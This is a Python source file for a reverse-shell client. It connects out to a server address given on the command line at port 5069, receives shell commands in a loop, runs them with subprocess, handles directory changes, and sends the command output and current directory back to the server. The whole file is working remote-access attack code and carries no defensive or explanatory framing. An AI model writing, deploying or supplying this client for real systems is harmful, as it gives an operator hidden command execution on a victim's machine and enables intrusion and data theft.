import socket
import os
import subprocess
import sys
from rich.console import Console
from rich.traceback import install
from rich.progress import track

install()
console = Console(record=True)
SERVER_HOST = sys.argv[1]
SERVER_PORT = 5069
BUFFER_SIZE = 1024 * 128 # 128KB max size of messages, feel free to increase
# separator string for sending 2 messages in one go
SEPARATOR = "<sep>"

# create the socket object
s = socket.socket()
# connect to the server
s.connect((SERVER_HOST, SERVER_PORT))
# get the current directory
cwd = os.getcwd()
s.send(cwd.encode())

if __name__ == "__main__":
    while True:
        # receive the command from the server
        command = s.recv(BUFFER_SIZE).decode()
        split_command = command.split()
        if command.lower() == "exit":
            # if the command is exit, just break out of the loop
            break
        if split_command[0].lower() == "cd":
            # cd command, change directory
            try:
                os.chdir(' '.join(split_command[1:]))
            except FileNotFoundError as e:
                # if there is an error, set as the output
                output = console.print_exception()
            else:
                # if operation is successful, empty message
                output = ""
        else:
            # execute the command and retrieve the results
            output = subprocess.getoutput(command)
        # get the current working directory as output
        cwd = os.getcwd()
        # send the results back to the server
        message = f"{output}{SEPARATOR}{cwd}"
        s.send(message.encode())
    # close client connection
    s.close()
